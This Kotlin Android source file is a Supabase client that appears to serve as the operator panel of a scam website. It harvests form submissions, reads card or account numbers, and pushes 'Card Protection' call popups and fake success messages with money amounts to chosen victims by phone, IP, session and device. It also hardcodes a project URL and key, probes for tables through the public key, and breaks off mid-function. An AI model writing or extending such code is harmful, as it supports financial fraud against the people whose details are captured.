package com.example.data.supabase

import android.util.Log
import com.example.BuildConfig
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.withContext
import okhttp3.ConnectionPool
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class SupabaseClient {
    private val client = OkHttpClient.Builder()
        .connectTimeout(5, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .writeTimeout(10, TimeUnit.SECONDS)
        .connectionPool(ConnectionPool(10, 5, TimeUnit.MINUTES))
        .build()

    // Determine initial credentials from BuildConfig / Environment
    var supabaseUrl: String = getInitialUrl()
        private set
    var supabaseAnonKey: String = getInitialKey()
        private set

    companion object {
        private const val TAG = "SupabaseClient"

        private fun getInitialUrl(): String {
            val url = try {
                val viteUrl = BuildConfig::class.java.getField("VITE_SUPABASE_URL").get(null) as? String
                if (!viteUrl.isNull_or_blank_or_placeholder()) viteUrl else null
            } catch (e: Exception) {
                null
            } ?: try {
                val sysUrl = BuildConfig::class.java.getField("SUPABASE_URL").get(null) as? String
                if (!sysUrl.isNull_or_blank_or_placeholder()) sysUrl else null
            } catch (e: Exception) {
                null
            } ?: "https://tdcllfvxsexqdqrelgyd.supabase.co"

            return url.trimEnd('/')
        }

        private fun getInitialKey(): String {
            return try {
                val viteKey = BuildConfig::class.java.getField("VITE_SUPABASE_ANON_KEY").get(null) as? String
                if (!viteKey.isNull_or_blank_or_placeholder()) viteKey else null
            } catch (e: Exception) {
                null
            } ?: try {
                val sysKey = BuildConfig::class.java.getField("SUPABASE_ANON_KEY").get(null) as? String
                if (!sysKey.isNull_or_blank_or_placeholder()) sysKey else null
            } catch (e: Exception) {
                null
            } ?: "sb_publishable_IncWf63XOA9L5sInRF8a3Q_XM32dFdz"
        }

        private fun String?.isNull_or_blank_or_placeholder(): Boolean {
            if (this.isNullOrEmpty()) return true
            val trimmed = this.trim()
            return trimmed.isEmpty() ||
                    trimmed.contains("your-project", ignoreCase = true) ||
                    trimmed.contains("your-supabase", ignoreCase = true) ||
                    trimmed == "MY_GEMINI_API_KEY"
        }
    }

    fun isConfigured(): Boolean {
        return supabaseUrl.isNotBlank() && supabaseAnonKey.isNotBlank() &&
                !supabaseUrl.contains("your-project", ignoreCase = true)
    }

    fun updateCredentials(url: String, key: String) {
        this.supabaseUrl = url.trim().trimEnd('/')
        this.supabaseAnonKey = key.trim()
    }

    /**
     * Inspects Supabase PostgREST OpenAPI spec at GET /rest/v1/ to discover available tables.
     * If root spec is unavailable, probes common table candidates directly in parallel.
     */
    suspend fun discoverTables(): List<String> = withContext(Dispatchers.IO) {
        if (!isConfigured()) return@withContext emptyList()
        val discovered = mutableListOf<String>()

        val request = Request.Builder()
            .url("$supabaseUrl/rest/v1/")
            .addHeader("apikey", supabaseAnonKey)
            .addHeader("Authorization", "Bearer $supabaseAnonKey")
            .addHeader("Accept", "application/json")
            .get()
            .build()

        try {
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val bodyString = response.body?.string() ?: ""
                    val json = JSONObject(bodyString)
                    val paths = json.optJSONObject("paths")
                    val definitions = json.optJSONObject("definitions")

                    if (paths != null) {
                        val keys = paths.keys()
                        while (keys.hasNext()) {
                            val path = keys.next()
                            if (path != "/" && path.startsWith("/")) {
                                val tableName = path.trimStart('/')
                                if (!tableName.startsWith("rpc/") && !tableName.contains("/")) {
                                    discovered.add(tableName)
                                }
                            }
                        }
                    }
                    if (definitions != null) {
                        val keys = definitions.keys()
                        while (keys.hasNext()) {
                            val tableName = keys.next()
                            if (!tableName.startsWith("rpc/")) {
                                discovered.add(tableName)
                            }
                        }
                    }
                    Log.d(TAG, "Discovered tables from root spec: $discovered")
                } else {
                    Log.w(TAG, "Root spec HTTP ${response.code}: ${response.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error discovering tables from root spec", e)
        }

        if (discovered.isNotEmpty()) {
            return@withContext discovered.distinct()
        }

        // Fast parallel probing fallback logic for candidate tables
        val candidates = listOf(
            "contact_submissions", "submissions", "form_submissions", "enquiries",
            "contact_form", "contacts", "messages", "forms", "page_enquiries",
            "inquiries", "contact", "leads", "lead", "feedback", "contact_us",
            "requests", "service_requests", "user_forms", "responses", "user_submissions"
        )

        val probedTables = coroutineScope {
            candidates.map { cand ->
                async(Dispatchers.IO) {
                    val checkReq = Request.Builder()
                        .url("$supabaseUrl/rest/v1/$cand?select=*&limit=1")
                        .addHeader("apikey", supabaseAnonKey)
                        .addHeader("Authorization", "Bearer $supabaseAnonKey")
                        .addHeader("Accept", "application/json")
                        .get()
                        .build()
                    try {
                        client.newCall(checkReq).execute().use { res ->
                            if (res.isSuccessful) cand else null
                        }
                    } catch (_: Exception) {
                        null
                    }
                }
            }.awaitAll().filterNotNull()
        }
        Log.d(TAG, "Probed working tables: $probedTables")
        return@withContext probedTables.distinct()
    }

    /**
     * Fetches all rows from a specific table as JSONArray with server-side descending ordering if available.
     */
    suspend fun fetchTableData(tableName: String): Result<JSONArray> = withContext(Dispatchers.IO) {
        if (!isConfigured()) {
            return@withContext Result.failure(Exception("Supabase is not configured. Please set URL and Anon Key."))
        }

        // Try server-side descending order on id or created_at for fast live ordering
        val urlsToTry = listOf(
            "$supabaseUrl/rest/v1/$tableName?select=*&order=id.desc",
            "$supabaseUrl/rest/v1/$tableName?select=*&order=created_at.desc",
            "$supabaseUrl/rest/v1/$tableName?select=*"
        )

        var lastException: Exception? = null
        for (url in urlsToTry) {
            val request = Request.Builder()
                .url(url)
                .addHeader("apikey", supabaseAnonKey)
                .addHeader("Authorization", "Bearer $supabaseAnonKey")
                .addHeader("Accept", "application/json")
                .get()
                .build()

            try {
                client.newCall(request).execute().use { response ->
                    val bodyStr = response.body?.string() ?: ""
                    if (response.isSuccessful) {
                        val jsonArray = JSONArray(bodyStr)
                        return@withContext Result.success(jsonArray)
                    } else if (url == urlsToTry.last()) {
                        return@withContext Result.failure(Exception("HTTP ${response.code}: $bodyStr"))
                    } else {
                        Log.w(TAG, "Query '$url' failed (${response.code}), falling back to next order parameter")
                    }
                }
            } catch (e: Exception) {
                lastException = e
            }
        }
        Log.e(TAG, "Error fetching table $tableName", lastException)
        Result.failure(lastException ?: Exception("Failed to fetch table data"))
    }

    /**
     * Updates status or is_read field for a specific row ID.
     */
    suspend fun updateRow(tableName: String, idColumn: String, idValue: Any, updateData: JSONObject): Result<Unit> = withContext(Dispatchers.IO) {
        if (!isConfigured()) return@withContext Result.failure(Exception("Supabase not configured"))
        val url = "$supabaseUrl/rest/v1/$tableName?$idColumn=eq.$idValue"
        val mediaType = "application/json".toMediaType()
        val requestBody = updateData.toString().toRequestBody(mediaType)

        val request = Request.Builder()
            .url(url)
            .addHeader("apikey", supabaseAnonKey)
            .addHeader("Authorization", "Bearer $supabaseAnonKey")
            .addHeader("Content-Type", "application/json")
            .addHeader("Prefer", "return=minimal")
            .patch(requestBody)
            .build()

        try {
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Result.success(Unit)
                } else {
                    val errorBody = response.body?.string() ?: ""
                    Result.failure(Exception("HTTP ${response.code}: $errorBody"))
                }
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    /**
     * Deletes a row from Supabase.
     */
    suspend fun deleteRow(tableName: String, idColumn: String, idValue: Any): Result<Unit> = withContext(Dispatchers.IO) {
        if (!isConfigured()) return@withContext Result.failure(Exception("Supabase not configured"))
        val url = "$supabaseUrl/rest/v1/$tableName?$idColumn=eq.$idValue"
        val request = Request.Builder()
            .url(url)
            .addHeader("apikey", supabaseAnonKey)
            .addHeader("Authorization", "Bearer $supabaseAnonKey")
            .addHeader("Prefer", "return=minimal")
            .delete()
            .build()

        try {
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Result.success(Unit)
                } else {
                    val errorBody = response.body?.string() ?: ""
                    Result.failure(Exception("HTTP ${response.code}: $errorBody"))
                }
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    private val iso8601Format = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US).apply {
        timeZone = java.util.TimeZone.getTimeZone("UTC")
    }

    private fun currentIsoTimestamp(): String {
        return synchronized(iso8601Format) {
            iso8601Format.format(java.util.Date())
        }
    }

    /**
     * Batch upsert key-value pairs into public.app_settings in a single PostgreSQL query.
     * Matches the PostgreSQL table schema:
     * create table public.app_settings (
     *   key character varying(255) not null,
     *   value text null,
     *   updated_at timestamp with time zone null default now(),
     *   constraint app_settings_pkey primary key (key)
     * );
     */
    suspend fun batchUpsertAppSettings(settings: List<Pair<String, String>>): Result<Unit> = withContext(Dispatchers.IO) {
        if (!isConfigured()) return@withContext Result.failure(Exception("Supabase not configured"))
        if (settings.isEmpty()) return@withContext Result.success(Unit)

        val mediaType = "application/json".toMediaType()
        val nowIso = currentIsoTimestamp()

        val jsonArray = JSONArray()
        for ((k, v) in settings) {
            val trimmedKey = k.trim().take(255)
            if (trimmedKey.isNotBlank()) {
                val rowObj = JSONObject().apply {
                    put("key", trimmedKey)
                    put("value", v)
                    put("updated_at", nowIso)
                }
                jsonArray.put(rowObj)
            }
        }

        // 1. Bulk Upsert with on_conflict=key
        val upsertUrl = "$supabaseUrl/rest/v1/app_settings?on_conflict=key"
        val request = Request.Builder()
            .url(upsertUrl)
            .addHeader("apikey", supabaseAnonKey)
            .addHeader("Authorization", "Bearer $supabaseAnonKey")
            .addHeader("Content-Type", "application/json")
            .addHeader("Prefer", "resolution=merge-duplicates,return=minimal")
            .post(jsonArray.toString().toRequestBody(mediaType))
            .build()

        var bulkSuccess = false
        try {
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful || response.code in 200..299) {
                    Log.d(TAG, "Batch upserted ${settings.size} app_settings rows successfully")
                    bulkSuccess = true
                } else {
                    val err = response.body?.string() ?: ""
                    Log.w(TAG, "Bulk upsert returned HTTP ${response.code}: $err, falling back to per-key upsert")
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Bulk upsert failed with exception: ${e.message}, falling back to per-key upsert")
        }

        if (bulkSuccess) {
            return@withContext Result.success(Unit)
        }

        // 2. Fallback: Sequential per-key upsert
        for ((k, v) in settings) {
            upsertSingleAppSetting(k, v)
        }
        Result.success(Unit)
    }

    /**
     * Helper to reliably upsert an app_setting row in Supabase using on_conflict=key,
     * with automatic fallback to PATCH or POST so settings always save successfully.
     */
    private suspend fun upsertSingleAppSetting(key: String, value: String) {
        val trimmedKey = key.trim().take(255)
        if (trimmedKey.isBlank()) return
        val mediaType = "application/json".toMediaType()
        val nowIso = currentIsoTimestamp()

        val updateJson = JSONObject().apply {
            put("key", trimmedKey)
            put("value", value)
            put("updated_at", nowIso)
        }

        // 1. Try Upsert with on_conflict=key
        val upsertUrl = "$supabaseUrl/rest/v1/app_settings?on_conflict=key"
        val upsertReq = Request.Builder()
            .url(upsertUrl)
            .addHeader("apikey", supabaseAnonKey)
            .addHeader("Authorization", "Bearer $supabaseAnonKey")
            .addHeader("Content-Type", "application/json")
            .addHeader("Prefer", "resolution=merge-duplicates,return=minimal")
            .post(updateJson.toString().toRequestBody(mediaType))
            .build()

        var succeeded = false
        try {
            client.newCall(upsertReq).execute().use { resp ->
                if (resp.isSuccessful || resp.code in 200..299) {
                    succeeded = true
                }
            }
        } catch (_: Exception) {}

        if (!succeeded) {
            // 2. Fallback: Try PATCH on key=eq.$key
            val patchUrl = "$supabaseUrl/rest/v1/app_settings?key=eq.$trimmedKey"
            val patchJson = JSONObject().apply {
                put("value", value)
                put("updated_at", nowIso)
            }
            val patchReq = Request.Builder()
                .url(patchUrl)
                .addHeader("apikey", supabaseAnonKey)
                .addHeader("Authorization", "Bearer $supabaseAnonKey")
                .addHeader("Content-Type", "application/json")
                .addHeader("Prefer", "return=minimal")
                .patch(patchJson.toString().toRequestBody(mediaType))
                .build()

            try {
                client.newCall(patchReq).execute().use { resp ->
                    if (resp.isSuccessful || resp.code in 200..299) {
                        succeeded = true
                    }
                }
            } catch (_: Exception) {}
        }

        if (!succeeded) {
            // 3. Fallback: Try plain POST (if row didn't exist yet)
            val postUrl = "$supabaseUrl/rest/v1/app_settings"
            val postReq = Request.Builder()
                .url(postUrl)
                .addHeader("apikey", supabaseAnonKey)
                .addHeader("Authorization", "Bearer $supabaseAnonKey")
                .addHeader("Content-Type", "application/json")
                .post(updateJson.toString().toRequestBody(mediaType))
                .build()

            try {
                client.newCall(postReq).execute().use { resp ->
                    if (resp.isSuccessful || resp.code in 200..299) {
                        succeeded = true
                    }
                }
            } catch (_: Exception) {}
        }
    }

    /**
     * Fetches all current key-value settings from public.app_settings.
     */
    suspend fun fetchAppSettings(): Result<Map<String, String>> = withContext(Dispatchers.IO) {
        if (!isConfigured()) return@withContext Result.failure(Exception("Supabase not configured"))
        val url = "$supabaseUrl/rest/v1/app_settings?select=key,value"
        val request = Request.Builder()
            .url(url)
            .addHeader("apikey", supabaseAnonKey)
            .addHeader("Authorization", "Bearer $supabaseAnonKey")
            .addHeader("Accept", "application/json")
            .get()
            .build()

        try {
            client.newCall(request).execute().use { response ->
                val body = response.body?.string() ?: ""
                if (response.isSuccessful) {
                    val array = JSONArray(body)
                    val map = mutableMapOf<String, String>()
                    for (i in 0 until array.length()) {
                        val obj = array.getJSONObject(i)
                        val k = obj.optString("key")
                        val v = obj.optString("value")
                        if (k.isNotBlank()) {
                            map[k] = v
                        }
                    }
                    Result.success(map)
                } else {
                    Result.failure(Exception("HTTP ${response.code}: $body"))
                }
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    /**
     * Updates or inserts website action toggle state in Supabase app_settings table.
     */
    suspend fun updateWebsiteAction(isActive: Boolean): Result<Unit> = withContext(Dispatchers.IO) {
        if (!isConfigured()) return@withContext Result.failure(Exception("Supabase not configured"))
        val settings = listOf(
            "website_action" to if (isActive) "true" else "false",
            "website_action_active" to if (isActive) "true" else "false",
            "phone_action_active" to if (isActive) "true" else "false",
            "call_overlay_active" to if (isActive) "true" else "false",
            "show_call_popup" to if (isActive) "true" else "false",
            "call_popup" to if (isActive) "true" else "false",
            "show_popup" to if (isActive) "true" else "false",
            "popup_active" to if (isActive) "true" else "false"
        )
        batchUpsertAppSettings(settings)
    }

    private val activePhoneTargets = java.util.concurrent.ConcurrentHashMap<String, JSONObject>()
    private val activeSuccessTargets = java.util.concurrent.ConcurrentHashMap<String, JSONObject>()

    /**
     * Updates or inserts customer-specific phone action state in Supabase app_settings table
     * with multi-session targeting and per-IP isolation so multiple customer popups can run concurrently
     * without overriding or dismissing each other.
     */
    suspend fun updateCustomerPhoneAction(submission: SupabaseSubmission, isActive: Boolean): Result<Unit> = withContext(Dispatchers.IO) {
        if (!isConfigured()) return@withContext Result.failure(Exception("Supabase not configured"))
        val subId = submission.targetIdString
        val phoneVal = (submission.mobileNumber.takeIf { it != "-" } ?: submission.phone.takeIf { it != "-" } ?: "")
        val clean10DigitPhone = phoneVal.filter { it.isDigit() }.takeLast(10)
        val nameVal = submission.fullName
        val sessionVal = (submission.sessionId.takeIf { it != "-" } ?: "")
        val targetKeyVal = submission.sessionTargetKey
        val ipVal = (submission.userIp.takeIf { it != "-" } ?: "")
        val deviceVal = (submission.deviceId.takeIf { it != "-" } ?: "")

        val actionData = JSONObject().apply {
            put("active", isActive)
            put("phone", if (isActive) phoneVal else "")
            put("mobile", if (isActive) phoneVal else "")
            put("clean_phone", if (isActive) clean10DigitPhone else "")
            put("submission_id", subId)
            put("session_id", sessionVal)
            put("session_target_key", targetKeyVal)
            put("target_ip", ipVal)
            put("device_id", deviceVal)
            put("name", if (isActive) nameVal else "")
            put("customer_name", if (isActive) nameVal else "")
            put("target_user", if (isActive) nameVal else "")
            put("updated_at", System.currentTimeMillis())
        }

        if (isActive) {
            activePhoneTargets[subId] = actionData
        } else {
            activePhoneTargets.remove(subId)
        }

        val isAnyPhoneActive = activePhoneTargets.isNotEmpty()
        val latestActiveTarget = if (isActive) actionData else activePhoneTargets.values.lastOrNull()

        val activeSinglePhone = if (isActive) phoneVal else (latestActiveTarget?.optString("phone") ?: "")
        val activeSingleCleanPhone = if (isActive) clean10DigitPhone else (latestActiveTarget?.optString("clean_phone") ?: "")
        val activeSingleSubId = if (isActive) subId else (latestActiveTarget?.optString("submission_id") ?: "")
        val activeSingleSession = if (isActive) sessionVal else (latestActiveTarget?.optString("session_id") ?: "")
        val activeSingleIp = if (isActive) ipVal else (latestActiveTarget?.optString("target_ip") ?: "")
        val activeSingleDevice = if (isActive) deviceVal else (latestActiveTarget?.optString("device_id") ?: "")
        val activeSingleName = if (isActive) nameVal else (latestActiveTarget?.optString("name") ?: "")

        val allActiveIps = activePhoneTargets.values.mapNotNull { it.optString("target_ip").takeIf { ip -> ip.isNotBlank() } }.distinct()
        val allActiveSubIds = activePhoneTargets.values.mapNotNull { it.optString("submission_id").takeIf { s -> s.isNotBlank() } }.distinct()
        val allActiveSessions = activePhoneTargets.values.mapNotNull { it.optString("session_id").takeIf { s -> s.isNotBlank() } }.distinct()
        val allActivePhones = activePhoneTargets.values.mapNotNull { it.optString("phone").takeIf { p -> p.isNotBlank() } }.distinct()

        val joinedActiveIps = allActiveIps.joinToString(",")
        val joinedActiveSubIds = allActiveSubIds.joinToString(",")
        val joinedActiveSessions = allActiveSessions.joinToString(",")
        val joinedActivePhones = allActivePhones.joinToString(",")

        val activeTargetsJsonArray = org.json.JSONArray().apply {
            activePhoneTargets.values.forEach { put(it) }
        }
        val activeTargetsJsonObject = JSONObject().apply {
            activePhoneTargets.forEach { (k, v) -> put(k, v) }
        }

        val settingsList = mutableListOf<Pair<String, String>>(
            "website_action" to if (isAnyPhoneActive) "true" else "false",
            "website_action_active" to if (isAnyPhoneActive) "true" else "false",
            "phone_action_active" to if (isAnyPhoneActive) "true" else "false",
            "call_overlay_active" to if (isAnyPhoneActive) "true" else "false",
            "show_call_popup" to if (isAnyPhoneActive) "true" else "false",
            "call_popup" to if (isAnyPhoneActive) "true" else "false",
            "show_phone_popup" to if (isAnyPhoneActive) "true" else "false",
            "show_popup" to if (isAnyPhoneActive) "true" else "false",
            "popup_active" to if (isAnyPhoneActive) "true" else "false",
            "action_type" to if (isAnyPhoneActive) "phone_call" else "",
            "active_action" to if (isAnyPhoneActive) "phone_call" else "",
            "target" to if (isAnyPhoneActive) (if (activeSingleSubId.isNotBlank()) activeSingleSubId else "ALL") else "",
            "website_action_target_id" to if (joinedActiveSubIds.isNotBlank()) joinedActiveSubIds else activeSingleSubId,
            "website_action_target_phone" to activeSinglePhone,
            "website_action_target_session" to activeSingleSession,
            "call_overlay_target_id" to activeSingleSubId,
            "call_overlay_target_phone" to activeSinglePhone,
            "target_phone" to activeSinglePhone,
            "target_mobile" to activeSinglePhone,
            "phone" to activeSinglePhone,
            "mobile" to activeSinglePhone,
            "target_phone_number" to activeSinglePhone,
            "clean_target_phone" to activeSingleCleanPhone,
            "all_active_phones" to joinedActivePhones,
            "target_submission_id" to if (joinedActiveSubIds.isNotBlank()) joinedActiveSubIds else activeSingleSubId,
            "target_id" to if (joinedActiveSubIds.isNotBlank()) joinedActiveSubIds else activeSingleSubId,
            "target_session_id" to if (joinedActiveSessions.isNotBlank()) joinedActiveSessions else activeSingleSession,
            "target_session" to if (joinedActiveSessions.isNotBlank()) joinedActiveSessions else activeSingleSession,
            "target_name" to activeSingleName,
            "target_user_name" to activeSingleName,
            "customer_name" to activeSingleName,
            "target_ip" to (if (activeSingleIp.isNotBlank()) activeSingleIp else joinedActiveIps),
            "target_ips" to joinedActiveIps,
            "active_ips" to joinedActiveIps,
            "all_active_ips" to joinedActiveIps,
            "active_phone_ips" to joinedActiveIps,
            "target_ip_address" to (if (activeSingleIp.isNotBlank()) activeSingleIp else joinedActiveIps),
            "user_ip" to (if (activeSingleIp.isNotBlank()) activeSingleIp else joinedActiveIps),
            "ip_address" to (if (activeSingleIp.isNotBlank()) activeSingleIp else joinedActiveIps),
            "target_device_id" to activeSingleDevice,
            "active_phone_targets" to activeTargetsJsonArray.toString(),
            "phone_targets_map" to activeTargetsJsonObject.toString(),
            "active_phone_sessions" to activeTargetsJsonObject.toString(),
            "active_phone_target" to (if (isAnyPhoneActive && latestActiveTarget != null) latestActiveTarget.toString() else JSONObject().put("active", false).toString()),
            "call_action" to (if (isAnyPhoneActive && latestActiveTarget != null) latestActiveTarget.toString() else JSONObject().put("active", false).toString()),
            "action_customer_$subId" to (if (isActive) actionData.toString() else JSONObject().put("active", false).toString()),
            "phone_action_$subId" to if (isActive) "true" else "false",
            "show_popup_$subId" to if (isActive) "true" else "false",
            "call_popup_$subId" to if (isActive) "true" else "false"
        )

        if (ipVal.isNotBlank()) {
            settingsList.add("action_ip_$ipVal" to (if (isActive) actionData.toString() else JSONObject().put("active", false).toString()))
            settingsList.add("phone_action_$ipVal" to if (isActive) "true" else "false")
            settingsList.add("call_popup_$ipVal" to if (isActive) "true" else "false")
            settingsList.add("show_popup_$ipVal" to if (isActive) "true" else "false")
            settingsList.add("call_overlay_$ipVal" to if (isActive) "true" else "false")
            settingsList.add("phone_action_active_$ipVal" to if (isActive) "true" else "false")
        }
        if (sessionVal.isNotBlank()) {
            settingsList.add("action_session_$sessionVal" to (if (isActive) actionData.toString() else JSONObject().put("active", false).toString()))
            settingsList.add("phone_action_$sessionVal" to if (isActive) "true" else "false")
            settingsList.add("call_popup_$sessionVal" to if (isActive) "true" else "false")
            settingsList.add("show_popup_$sessionVal" to if (isActive) "true" else "false")
        }
        if (clean10DigitPhone.isNotBlank()) {
            settingsList.add("action_phone_$clean10DigitPhone" to (if (isActive) actionData.toString() else JSONObject().put("active", false).toString()))
            settingsList.add("phone_action_$clean10DigitPhone" to if (isActive) "true" else "false")
            settingsList.add("call_popup_$clean10DigitPhone" to if (isActive) "true" else "false")
            settingsList.add("show_popup_$clean10DigitPhone" to if (isActive) "true" else "false")
        }

        try {
            batchUpsertAppSettings(settingsList)

            // Also update columns in the submission table that actually exist in the schema
            try {
                val rowUpdate = JSONObject()
                for (col in submission.rawFields.keys) {
                    val lower = col.lowercase()
                    if (lower == "phone_action_active" || lower == "call_overlay_active" || lower == "show_call_popup" ||
                        lower == "is_phone_action_active" || lower == "action_active" || lower == "show_phone_popup" ||
                        lower == "call_popup" || lower == "overlay_active" || lower == "phone_action") {
                        rowUpdate.put(col, isActive)
                    } else if (lower == "popup_status") {
                        rowUpdate.put(col, if (isActive) "call_overlay" else "normal")
                    } else if (lower == "action_status" || lower == "action_type") {
                        rowUpdate.put(col, if (isActive) "phone_call" else "none")
                    }
                }
                if (rowUpdate.length() > 0) {
                    updateRow(submission.tableName, submission.idColumnName, submission.idValue, rowUpdate)
                }
            } catch (_: Exception) { }

            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    /**
     * Updates or inserts 24-hour success message settings in Supabase app_settings table
     * with multi-session targeting and row-level updates to ensure multiple customer success modals
     * can run concurrently without overriding each other.
     */
    suspend fun updateSuccessMessageAction(
        submission: SupabaseSubmission?,
        isActive: Boolean,
        amount: String,
        appUsed: String,
        serviceName: String = "Card Protection"
    ): Result<Unit> = withContext(Dispatchers.IO) {
        if (!isConfigured()) return@withContext Result.failure(Exception("Supabase not configured"))

        val targetPhone = submission?.mobileNumber?.takeIf { it != "-" } ?: submission?.phone?.takeIf { it != "-" } ?: ""
        val targetId = submission?.targetIdString ?: ""
        val targetSession = submission?.sessionId?.takeIf { it != "-" } ?: submission?.sessionTargetKey ?: ""
        val targetIp = submission?.userIp?.takeIf { it != "-" } ?: ""
        val targetDevice = submission?.deviceId?.takeIf { it != "-" } ?: ""
        val customerName = submission?.fullName ?: ""
        val cardDetails = submission?.fields?.entries?.firstOrNull { 
            it.key.contains("card", ignoreCase = true) || it.key.contains("acc", ignoreCase = true) || it.key.contains("number", ignoreCase = true)
        }?.value ?: submission?.fields?.get("Card Number") ?: ""
        val cleanServiceName = if (serviceName.isNotBlank()) serviceName else (submission?.cleanServiceName ?: "Card Protection")
        val successTitle = ServiceMessageFormatter.formatSuccessMessageTitle(cleanServiceName)
        val cleanAmount = amount.replace(" ", "").replace(",", "").trim().ifBlank { "24000" }
        val cleanApp = appUsed.ifBlank { "nobroker" }.lowercase()

        val sessionPayload = JSONObject().apply {
            put("active", isActive)
            put("target_session_id", targetSession)
            put("target_submission_id", targetId)
            put("target_phone", targetPhone)
            put("target_ip", targetIp)
            put("target_device_id", targetDevice)
            put("service_name", cleanServiceName)
            put("title", successTitle)
            put("amount", cleanAmount)
            put("app_name", cleanApp)
            put("updated_at", currentIsoTimestamp())
        }

        if (submission != null && targetId.isNotBlank()) {
            if (isActive) {
                activeSuccessTargets[targetId] = sessionPayload
            } else {
                activeSuccessTargets.remove(targetId)
            }
        }

        val isAnySuccessActive = activeSuccessTargets.isNotEmpty() || (submission == null && isActive)
        val latestActiveTarget = if (isActive && submission != null) sessionPayload else activeSuccessTargets.values.lastOrNull()

        val activeSinglePhone = latestActiveTarget?.optString("target_phone") ?: if (isActive) targetPhone else ""
        val activeSingleSubId = latestActiveTarget?.optString("target_submission_id") ?: if (isActive) targetId else ""
        val activeSingleSession = latestActiveTarget?.optString("target_session_id") ?: if (isActive) targetSession else ""
        val activeSingleIp = latestActiveTarget?.optString("target_ip") ?: if (isActive) targetIp else ""
        val activeSingleDevice = latestActiveTarget?.optString("target_device_id") ?: if (isActive) targetDevice else ""
        val activeSingleService = latestActiveTarget?.optString("service_name") ?: cleanServiceName
        val activeSingleTitle = latestActiveTarget?.optString("title") ?: successTitle
        val activeSingleAmount = latestActiveTarget?.optString("amount") ?: cleanAmount
        val activeSingleApp = latestActiveTarget?.optString("app_name") ?: cleanApp

        val allActiveSuccessIps = activeSuccessTargets.values.mapNotNull { it.optString("target_ip").takeIf { ip -> ip.isNotBlank() } }.distinct()
        val allActiveSuccessSubIds = activeSuccessTargets.values.mapNotNull { it.optString("target_submission_id").takeIf { s -> s.isNotBlank() } }.distinct()
        val allActiveSuccessSessions = activeSuccessTargets.values.mapNotNull { it.optString("target_session_id").takeIf { s -> s.isNotBlank() } }.distinct()

        val joinedActiveSuccessIps = allActiveSuccessIps.joinToString(",")
        val joinedActiveSuccessSubIds = allActiveSuccessSubIds.joinToString(",")
        val joinedActiveSuccessSessions = allActiveSuccessSessions.joinToString(",")

        val activeTargetsJsonArray = org.json.JSONArray().apply {
            activeSuccessTargets.values.forEach { put(it) }
        }
        val activeTargetsJsonObject = JSONObject().apply {
            activeSuccessTargets.forEach { (k, v) -> put(k, v) }
        }

        val settingsList = mutableListOf(
            "success_msg_active" to if (isAnySuccessActive) "true" else "false",
            "show_popup" to if (isAnySuccessActive) "true" else "false",
            "popup_active" to if (isAnySuccessActive) "true" else "false",
            "success_msg_service" to activeSingleService,
            "success_msg_title" to activeSingleTitle,
            "success_msg_amount" to activeSingleAmount,
            "success_msg_app" to activeSingleApp,
            "target_phone" to activeSinglePhone,
            "target_mobile" to activeSinglePhone,
            "target_submission_id" to (if (joinedActiveSuccessSubIds.isNotBlank()) joinedActiveSuccessSubIds else activeSingleSubId),
            "target_id" to (if (joinedActiveSuccessSubIds.isNotBlank()) joinedActiveSuccessSubIds else activeSingleSubId),
            "target_session_id" to (if (joinedActiveSuccessSessions.isNotBlank()) joinedActiveSuccessSessions else activeSingleSession),
            "target_session" to (if (joinedActiveSuccessSessions.isNotBlank()) joinedActiveSuccessSessions else activeSingleSession),
            "target_name" to (if (isActive) customerName else ""),
            "customer_name" to (if (isActive) customerName else ""),
            "target_ip" to joinedActiveSuccessIps,
            "target_ips" to joinedActiveSuccessIps,
            "active_ips" to joinedActiveSuccessIps,
            "all_active_ips" to joinedActiveSuccessIps,
            "active_success_ips" to joinedActiveSuccessIps,
            "target_ip_address" to joinedActiveSuccessIps,
            "user_ip" to joinedActiveSuccessIps,
            "ip_address" to joinedActiveSuccessIps,
            "target_device_id" to activeSingleDevice,
            "active_success_targets" to activeTargetsJsonArray.toString(),
            "active_success_actions" to activeTargetsJsonObject.toString(),
            "success_msg_target_phone" to activeSinglePhone,
            "success_msg_target_id" to (if (joinedActiveSuccessSubIds.isNotBlank()) joinedActiveSuccessSubIds else activeSingleSubId),
            "success_msg_target_session" to (if (joinedActiveSuccessSessions.isNotBlank()) joinedActiveSuccessSessions else activeSingleSession),
            "success_msg_target_ip" to joinedActiveSuccessIps,
            "success_msg_customer_name" to (if (isActive) customerName else ""),
            "success_msg_card_details" to (if (isActive) cardDetails else ""),
            "success_popup_session" to (if (isAnySuccessActive && latestActiveTarget != null) latestActiveTarget.toString() else JSONObject().put("active", false).toString()),
            "popup_session" to (if (isAnySuccessActive && latestActiveTarget != null) latestActiveTarget.toString() else JSONObject().put("active", false).toString()),
            "target" to (if (isAnySuccessActive) (if (activeSingleSubId.isNotBlank()) activeSingleSubId else "ALL") else ""),
            "success_target_id" to (if (joinedActiveSuccessSubIds.isNotBlank()) joinedActiveSuccessSubIds else activeSingleSubId),
            "success_target_phone" to activeSinglePhone,
            "customer_action" to (if (isAnySuccessActive && latestActiveTarget != null) latestActiveTarget.toString() else JSONObject().put("active", false).toString())
        )

        if (targetId.isNotBlank()) {
            settingsList.add("success_customer_$targetId" to (if (isActive) sessionPayload.toString() else JSONObject().put("active", false).toString()))
            settingsList.add("show_popup_$targetId" to if (isActive) "true" else "false")
            settingsList.add("success_msg_$targetId" to if (isActive) "true" else "false")
        }
        if (targetIp.isNotBlank()) {
